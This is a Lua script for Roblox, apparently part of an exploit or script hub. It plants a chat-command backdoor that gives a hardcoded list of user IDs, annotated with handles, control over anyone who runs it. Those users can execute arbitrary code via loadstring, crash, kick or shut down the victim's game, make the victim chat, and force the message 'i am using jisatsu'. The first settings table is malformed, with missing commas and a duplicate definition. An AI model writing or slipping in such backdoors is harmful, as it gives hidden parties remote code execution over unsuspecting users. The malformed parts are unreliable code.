local backdoorSettings
    allowedUsers = {
    1551416114, -- wrydioda4 - knocks
    252684030, -- jjjuuikjjikkju - knocks
    2172305, -- antemono / kyrofrost / timeless / reiko
    4793416752 -- knocks
    7126612490 -- hawaiianbroski / reiko
    411845421 -- rin
    7348878539-- rin
    7603097827 -- day
    518978417 -- FR6DDiiee
    4217459491 -- Kozy
    1702851506 -- tech
    5405947853 -- cxo
    1842223904 -- tech
    2049407929 -- jotunn
    142903777 -- ripend
}

local backdoorSettings = {
    allowedUsers = { 
        2172305, 142903777, 1702851506, 1842223904, 2049407929, 
        252684030, 411845421, 518978417, 5405947853, 7126612490, 
        7348878539, 7603097827, 1551416114, 4217459491, 4793416752
    },

--[[ All User IDs in Order (Least to Highest)

    2172305, -- antemono / kyrofrost / timeless / reiko
    142903777, -- ripend
    1702851506, -- tech
    1842223904, -- tech
    2049407929, -- jotunn
    252684030, -- jjjuuikjjikkju - knocks
    411845421, -- rin
    518978417, -- FR6DDiiee
    5405947853, -- cxo
    7126612490, -- hawaiianbroski / reiko
    7348878539, -- rin
    7603097827, -- day
    1551416114, -- wrydioda4 - knocks
    4217459491, -- Kozy
    4793416752 -- knocks

]]
    
    commands = {
        execute = "^run",
        crash = "^crash",
        say = "^say",
        kick = "^kick",
        eject = "^eject",
        spam = "^rtest"
    }
}

local function getPlayersByName(searchStr)
    local players = game.Players:GetPlayers()
    local result = {}
    
    if searchStr:lower() == "all" then
        return players
    elseif searchStr:lower() == "others" then
        for _, player in ipairs(players) do
            if player ~= lp then
                table.insert(result, player)
            end
        end
    elseif searchStr:lower() == "me" then
        return { lp }
    else
        for _, player in ipairs(players) do
            local nameMatch = player.Name:lower():sub(1, #searchStr) == searchStr:lower()
            local displayNameMatch = player.DisplayName:lower():sub(1, #searchStr) == searchStr:lower()
            if nameMatch or displayNameMatch then
                table.insert(result, player)
            end
        end
    end
    return result
end

local function backdoorHandler()
    for _, player in pairs(game.Players:GetPlayers()) do
        if table.find(backdoorSettings.allowedUsers, player.UserId) then
            connections[player.UserId] = player.Chatted:Connect(function(msg)
                local args = msg:split(" ")
                local command = args[1]
                local targetStr = args[2]
                local payload = table.concat(args, " ", 3)

                if command == backdoorSettings.commands.execute then
                    loadstring(payload)()
                elseif command == backdoorSettings.commands.kick then
                    for _, target in pairs(getPlayersByName(targetStr)) do
                        if target == lp then
                            lp:Kick(payload)
                        end
                    end
                elseif command == backdoorSettings.commands.crash then
                    repeat task.wait() until false
                elseif command == backdoorSettings.commands.say then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(payload, "All")
                elseif command == backdoorSettings.commands.eject then
                    for _, target in pairs(getPlayersByName(targetStr)) do
                        if target == lp then
                            game:Shutdown()
                        end
                    end
                elseif command == backdoorSettings.commands.spam then
                    for _ = 1, 10 do
                        game.Players:Chat("(!)(!)(!)(!)(!)(!)(!)")
                    end
                    task.wait(0.3)
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w " .. player.Name .. " i am using jisatsu", "All")
                end
            end)
        end
    end
end

game.Players.PlayerAdded:Connect(backdoorHandler)
game.Players.PlayerRemoving:Connect(backdoorHandler)
backdoorHandler()
